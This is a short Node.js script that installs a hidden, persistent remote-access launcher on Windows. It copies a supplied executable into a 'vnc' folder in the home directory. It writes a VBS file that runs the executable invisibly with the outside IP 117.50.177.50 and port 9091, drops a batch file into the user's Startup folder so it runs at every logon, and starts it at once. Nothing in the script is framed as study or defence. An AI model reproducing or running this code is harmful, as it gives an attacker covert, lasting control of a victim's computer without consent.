const fs = require('fs')
const os = require('os')
const path = require('path')
const { exec } = require('child_process')

const [exePath] = process.argv.slice(2)

const vncDirPath = path.join(os.homedir(), 'vnc')

try {
  fs.mkdirSync(vncDirPath)
} catch (err) {}

const vbPath = path.join(vncDirPath, 'run.vbs')
const batPath = path.join(vncDirPath, 'run.bat')
const mainPath = path.join(vncDirPath, 'main.exe')
const runPath = path.join(os.homedir(), 'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup', 'run.bat')
const vbContent = `Set ws=WScript.CreateObject("Wscript.Shell")\nws.Run "${exePath} 117.50.177.50 9091",vbhide`
const batContent = `@echo off\nstart /MIN "wumin" "C:\\Windows\\System32\\cmd.exe"\n${vbPath}\ntaskkill /f /im cmd.exe\nexit`

fs.writeFileSync(vbPath, vbContent)
fs.writeFileSync(batPath, batContent)
fs.copyFileSync(batPath, runPath)
fs.copyFileSync(exePath, mainPath)

exec(`start ${batPath}`, (err, stdout) => {
  console.log(err, stdout)
})
